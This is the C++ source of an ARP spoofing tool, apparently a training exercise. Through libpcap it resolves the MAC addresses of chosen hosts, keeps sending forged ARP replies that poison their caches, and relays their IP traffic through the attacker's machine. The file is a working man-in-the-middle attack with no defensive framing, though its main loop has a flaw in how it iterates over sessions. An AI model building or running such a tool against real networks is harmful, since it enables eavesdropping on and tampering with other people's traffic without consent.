#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <pthread.h>
#include <utility>
#include <list>
#include <map>

using namespace std;

#define ETHER_ADDR_LEN	6
#define IP_ADDR_LEN 4
#define ETHERTYPE_IPV4 0x0800
#define ETHERTYPE_ARP 0x0806
#define ETHERNET_SIZE 14
#define E_IP_ARP_SIZE 28

struct ethernet {
		uint8_t ether_dhost[ETHER_ADDR_LEN];
		uint8_t ether_shost[ETHER_ADDR_LEN];
		uint16_t ether_type;
};

struct ethernet_ip_arp {
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t operation;
	uint8_t sha[6];
	uint8_t spa[4];
	uint8_t tha[6];
	uint8_t tpa[4];
};


struct sniff_ip {
		uint8_t ip_vhl;
		uint8_t ip_tos;
		uint16_t ip_len;
		uint16_t ip_id;
		uint16_t ip_off;
		uint8_t ip_ttl;
		uint8_t ip_p;
		uint16_t ip_sum;
		struct in_addr ip_src,ip_dst;
};

void usage() {
  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
  printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

struct Mac{
	uint8_t addr[ETHER_ADDR_LEN]={0};
};

list<pair<in_addr, in_addr>> sessions;
struct in_addr my_ip;
uint8_t my_mac[6], my_ArpPacket[ETHERNET_SIZE+E_IP_ARP_SIZE];
map<uint32_t, Mac> sender_macs, target_macs;
struct in_addr *sender_ips, *target_ips;

int get_myinfo()
{
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) {
  	printf("socket open error\n");
	return -1;
    };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) {
	    printf("socket info error\n");
	    return -1;
    }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else {
		printf("socket get flag error\n");
		return -1;
	}
    }

    if (success){
	    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
	    ioctl(sock, SIOCGIFADDR, &ifr);
	    my_ip =  ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
	    printf("Attacker's : %s\n" ,inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr) );
	    return 0;
    }
    return -1;
}

int send_arpreq(pcap_t * handle,  uint32_t sender_ip)
{
	struct ethernet * my_ether = (struct ethernet *)my_ArpPacket;
  	memset(my_ether->ether_dhost, 0xff, ETHER_ADDR_LEN);

  	struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_ArpPacket + ETHERNET_SIZE);
  	my_arp->operation = htons(1);
  	memcpy(my_arp->tpa, &sender_ip, 4);
  	memset(my_arp->tha, 0, ETHER_ADDR_LEN);
  	memcpy(my_arp->spa, &(my_ip.s_addr),4);
  	memcpy(my_arp->sha, my_mac, ETHER_ADDR_LEN);

  	if(pcap_sendpacket(handle, my_ArpPacket, ETHERNET_SIZE+E_IP_ARP_SIZE)==-1)
  	{
		printf("send errror\n");
		return -1;
  	}
	return 0;
}

void init_MyArpPacket()
{
	struct ethernet * my_ether = (struct ethernet *)my_ArpPacket;
  	my_ether->ether_type = htons(ETHERTYPE_ARP);
	memcpy(my_ether->ether_shost, my_mac, ETHER_ADDR_LEN);

	struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_ArpPacket + ETHERNET_SIZE);
	my_arp->htype = htons(1); //ethernet
  	my_arp->ptype = htons(0x0800);
  	my_arp->hlen = 6;
  	my_arp->plen = 4;
	return;
}

int resolve_senders(pcap_t* handle)
{
	int success = 1;
	init_MyArpPacket();
	for(map<uint32_t,Mac>::iterator it = sender_macs.begin(); it != sender_macs.end(); it++)
	{
		int tmp_success = 0;
		while(true)
		{
				uint32_t tmp_ip = (*it).first;
				struct pcap_pkthdr* header;
				const uint8_t* packet;
				if(send_arpreq(handle, tmp_ip)==-1) return -1;
				int res = pcap_next_ex(handle, &header, &packet);
				if (res == 0) continue;
				if (res == -1 || res == -2) break;

				struct ethernet * req_ether = (struct ethernet *)packet;
				if(ntohs(req_ether->ether_type) != ETHERTYPE_ARP) continue;

				struct ethernet_ip_arp * arp = (struct ethernet_ip_arp *)(packet + ETHERNET_SIZE);
				if(*(uint *)(arp->spa) != tmp_ip || ntohs(arp->operation)!=2) continue;

				memcpy(&((*it).second.addr), arp->sha, ETHER_ADDR_LEN);
				printf("Sender's Mac : ");
                		for(int j=0; j<6; j++) printf("%02x:", (*it).second.addr[j]);
				printf("\n");

				tmp_success = 1;
				break;
	 	}
		if(!tmp_success){
                        success=0;
                        break;
                }
	}
	

	for(map<uint32_t,Mac>::iterator it = target_macs.begin(); it != target_macs.end() && success; it++)
	{
		int tmp_success = 0;
		while(true)
                {
				uint32_t tmp_ip = (*it).first;
                                struct pcap_pkthdr* header;
                                const uint8_t* packet;
                                if(send_arpreq(handle, tmp_ip)==-1) return -1;
                                int res = pcap_next_ex(handle, &header, &packet);
                                if (res == 0) continue;
                                if (res == -1 || res == -2) break;

                                struct ethernet * req_ether = (struct ethernet *)packet;
                                if(ntohs(req_ether->ether_type) != ETHERTYPE_ARP) continue;

                                struct ethernet_ip_arp * arp = (struct ethernet_ip_arp *)(packet + ETHERNET_SIZE);
                                if(*(uint *)(arp->spa) != tmp_ip || ntohs(arp->operation)!=2) continue;

                                memcpy(&((*it).second.addr), arp->sha, ETHER_ADDR_LEN);
                                printf("Target's Mac : ");
                                for(int j=0; j<6; j++) printf("%02x:", (*it).second.addr[j]);
                                printf("\n");
				tmp_success = 1;
                                break;
                }
		if(!tmp_success){
			success=0;
			break;
		}
	}

	if(!success){
		printf("can't resolve sender's mac\n");
		return -1;
	}
	

	return 0;
}

void try_relay(pcap_t* handle, struct ethernet *req_ether, uint32_t len, uint32_t target_ip)
{
	if(!memcmp(req_ether->ether_dhost, my_mac, ETHER_ADDR_LEN)){
		memcpy(req_ether->ether_shost, my_mac, ETHER_ADDR_LEN);
		memcpy(req_ether->ether_dhost, target_macs[target_ip].addr, ETHER_ADDR_LEN);
		if(pcap_sendpacket(handle, (const u_char*)req_ether, len)==-1){
				printf("send errrrrrrrrrrr\n");
				return;
		}
		printf("relaying...\n");
	}
}

int arp_attack(pcap_t* handle, struct in_addr sip, struct in_addr tip, Mac s_mac)
{
	struct ethernet * my_ether = (struct ethernet *)my_ArpPacket;
	struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_ArpPacket+ETHERNET_SIZE);
	memcpy(my_ether->ether_dhost, s_mac.addr, ETHER_ADDR_LEN);
	
	my_arp->operation = htons(2);
	memcpy(my_arp->tpa, &(sip.s_addr), 4);
  	memcpy(my_arp->tha, s_mac.addr, ETHER_ADDR_LEN);
  	memcpy(my_arp->spa, &(tip.s_addr),4);
	memcpy(my_arp->sha, my_mac, ETHER_ADDR_LEN);

	if(pcap_sendpacket(handle, my_ArpPacket, ETHERNET_SIZE+E_IP_ARP_SIZE)==-1)
	{
		printf("send errror\n");
		return -1;
	}
	return 0;
}

void * periodic_arp_attack(void * handle){
	
	while(true){
		list<pair<in_addr, in_addr>>::iterator it = sessions.begin();
        	for(; it != sessions.end(); it++){
                	arp_attack((pcap_t*)handle , (*it).first, (*it).second, sender_macs[(*it).first.s_addr]);
        	}
		sleep(3);
	}	
}

int main(int argc, char* argv[])
{
	if (argc < 4 || argc%2 == 1)
       	{
		usage();
		return -1;
	}
	
	int session_num = (argc-2)/2;
	char* dev = argv[1];
	pthread_t tid;

		
	for(int i=0; i < session_num; i++)
  	{
		struct in_addr sender_ip, target_ip;
		inet_pton(AF_INET, argv[2*i+2], &sender_ip);
		inet_pton(AF_INET, argv[2*i+3], &target_ip);
		sessions.push_back(make_pair(sender_ip, target_ip));

		sender_macs[sender_ip.s_addr] = Mac();
		target_macs[target_ip.s_addr] = Mac();
 	 }
	
  	if(!get_myinfo())//set my_mac and my_ip
	{
		printf("Attacker's Mac : ");
	 	for(int i=0; i<6; i++) printf("%02x:", my_mac[i]);
	  	printf("\n");
  	}

  	char errbuf[PCAP_ERRBUF_SIZE];
  	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  	if (handle == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    		return -1;
 	}
	
  	if(resolve_senders(handle) == -1) return -1;
	
	list<pair<in_addr, in_addr>>::iterator it = sessions.begin();
        for(; it != sessions.end(); it++){
                arp_attack(handle , (*it).first, (*it).second, sender_macs[(*it).first.s_addr]);
        }

  	uint16_t type_arp, type_ip, operation_chk;
	type_arp = htons((uint16_t)ETHERTYPE_ARP);
	type_ip = htons((uint16_t)ETHERTYPE_IPV4);
	operation_chk = htons((uint16_t)1);

	pthread_create(&tid, NULL, periodic_arp_attack, (void*)handle);

	while (true)
	{
		struct pcap_pkthdr* header;
		const uint8_t* packet;
    		int res = pcap_next_ex(handle, &header, &packet);
    		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		struct ethernet * req_ether = (struct ethernet *)packet;
		struct ethernet_ip_arp * req_arp = (struct ethernet_ip_arp *)(packet + ETHERNET_SIZE);

		if((req_ether->ether_type)==type_ip) 
		{
			struct sniff_ip * req_ip = (struct sniff_ip *)(packet + ETHERNET_SIZE);
			for(; it != sessions.end(); it++)
			{
				struct in_addr sender_ip, target_ip;
				sender_ip.s_addr = (*it).first.s_addr;
				target_ip.s_addr = (*it).second.s_addr;
				uint32_t relay_length = ntohs(req_ip->ip_len) + ETHERNET_SIZE;	
				if((req_ip->ip_src.s_addr == sender_ip.s_addr) && (req_ip->ip_dst.s_addr == target_ip.s_addr)) try_relay(handle,  (struct ethernet *)packet, relay_length, target_ip.s_addr);
			}
		}
		else if((req_ether->ether_type)==type_arp)
		{
			for(; it != sessions.end(); it++){
				struct in_addr sender_ip, target_ip;
                                sender_ip.s_addr = (*it).first.s_addr;
                                target_ip.s_addr = (*it).second.s_addr;

				if(((((struct in_addr *)(req_arp->tpa))->s_addr == target_ip.s_addr) && (((struct in_addr *)(req_arp->spa))->s_addr == sender_ip.s_addr)) || ((((struct in_addr *)(req_arp->tpa))->s_addr == sender_ip.s_addr) && (((struct in_addr *)(req_arp->spa))->s_addr == target_ip.s_addr))){

					if(arp_attack(handle, sender_ip, target_ip, sender_macs[sender_ip.s_addr])) return -1;
					printf("send arp attack!!!!!\n");
				}
			}
		}
  }

  pcap_close(handle);
  return 0;
}
